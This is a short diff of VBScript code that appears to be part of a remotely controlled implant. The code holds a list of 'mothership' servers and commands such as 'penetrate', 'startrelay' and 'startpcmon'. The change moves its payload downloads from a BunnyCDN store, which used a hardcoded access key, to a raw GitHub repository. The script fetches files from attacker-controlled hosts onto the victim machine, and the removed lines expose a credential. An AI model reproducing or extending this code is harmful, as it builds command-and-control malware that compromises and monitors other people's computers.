@@ -244,9 +244,7 @@ Function RetrieveAsset(fname, localfpath)
     Dim pp : pp = "RetrieveAsset"
     
     Dim headersout
-    Dim headersin : set headersin = GetBunnyHeaderDict()
-    
-    RetrieveAsset = DownloadFileWithHeaders(mothershipassets & "/ow/assets/" & fname, localfpath, headersin, headersout)
+    RetrieveAsset = DownloadFileWithHeaders(mothershipassets & fname, localfpath, Nothing, headersout)
     
     If not RetrieveAsset Then
         Call LogMsg(pp & " -- download failed")
@@ -1107,8 +1105,8 @@ mothershiplist(2) = "https://darksalmon-crow-356809.hostingersite.com"
 Dim selectedmothershipindex : selectedmothershipindex = 0
 Dim mothership : mothership = mothershiplist(selectedmothershipindex)
 
-Dim mothershipassets : mothershipassets = "https://ny.storage.bunnycdn.com/testdev"
-Dim bunnyheader : bunnyheader="AccessKey: c64e71da-aac7-4b07-8ceb3fe9813f-af55-4d3a"
+Dim mothershipassets : mothershipassets = "https://raw.githubusercontent.com/owd842/mothershipassets/master/"
+
 
 Dim cmdslist : cmdslist = Array("ping", "cmdlist", "watchdog", "retrieve", "penetrate", "reschedule", "startrelay", "startpcmon")
 
